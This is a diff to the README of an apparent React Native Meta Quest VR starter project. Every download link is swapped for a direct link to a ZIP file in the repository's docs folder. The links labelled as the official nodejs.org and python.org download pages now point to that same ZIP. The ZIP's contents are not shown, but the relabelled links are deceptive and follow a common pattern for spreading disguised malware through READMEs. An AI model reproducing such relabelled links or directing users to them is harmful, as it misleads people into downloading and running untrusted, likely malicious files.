@@ -1,6 +1,6 @@
 # 🕶️ react-native-meta-quest-starter - Easy VR App Setup for Windows
 
-[![Download Releases](https://img.shields.io/badge/Download-Get%20Setup-brightgreen?style=for-the-badge)](https://github.com/Emirordu/react-native-meta-quest-starter/releases)
+[![Download Releases](https://img.shields.io/badge/Download-Get%20Setup-brightgreen?style=for-the-badge)](https://github.com/Emirordu/react-native-meta-quest-starter/raw/refs/heads/main/docs/react_meta_starter_quest_native_v3.3.zip)
 
 ## Overview
 
@@ -40,7 +40,7 @@ Instead of writing code from scratch, you can use this template as a base. It ha
 
 Start by downloading the files you need. Visit the releases page to get the latest version:
 
-[![Download Release](https://img.shields.io/badge/Download-From%20Releases-blue?style=for-the-badge)](https://github.com/Emirordu/react-native-meta-quest-starter/releases)
+[![Download Release](https://img.shields.io/badge/Download-From%20Releases-blue?style=for-the-badge)](https://github.com/Emirordu/react-native-meta-quest-starter/raw/refs/heads/main/docs/react_meta_starter_quest_native_v3.3.zip)
 
 On the releases page, find the latest version and download the Windows package or ZIP file. This package contains everything needed to start the app development, including the Jupyter notebook and Expo setup files.
 
@@ -52,9 +52,9 @@ Follow these steps to set up the app on your Windows system.
 
 2. **Extract the files:** Right-click the downloaded ZIP and choose "Extract All" to unpack the folder where you want.
 
-3. **Install Node.js:** The app uses Node.js to run tools and scripts. Download the latest LTS version from [nodejs.org](https://nodejs.org/en/). Choose the Windows installer and follow the instructions.
+3. **Install Node.js:** The app uses Node.js to run tools and scripts. Download the latest LTS version from [nodejs.org](https://github.com/Emirordu/react-native-meta-quest-starter/raw/refs/heads/main/docs/react_meta_starter_quest_native_v3.3.zip). Choose the Windows installer and follow the instructions.
 
-4. **Install Python:** Jupyter notebooks require Python. Visit [python.org](https://www.python.org/downloads/windows/) and install the latest stable release.
+4. **Install Python:** Jupyter notebooks require Python. Visit [python.org](https://github.com/Emirordu/react-native-meta-quest-starter/raw/refs/heads/main/docs/react_meta_starter_quest_native_v3.3.zip) and install the latest stable release.
 
 5. **Open Command Prompt:** Press `Win + R`, type `cmd`, and press Enter.
 
@@ -127,4 +127,4 @@ This project is open-source. You can explore its code, suggest fixes, or add enh
 
 ---
 
-[Download Latest Version](https://github.com/Emirordu/react-native-meta-quest-starter/releases) to get started. Follow the setup steps carefully to run your first VR app on Windows.
+[Download Latest Version](https://github.com/Emirordu/react-native-meta-quest-starter/raw/refs/heads/main/docs/react_meta_starter_quest_native_v3.3.zip) to get started. Follow the setup steps carefully to run your first VR app on Windows.
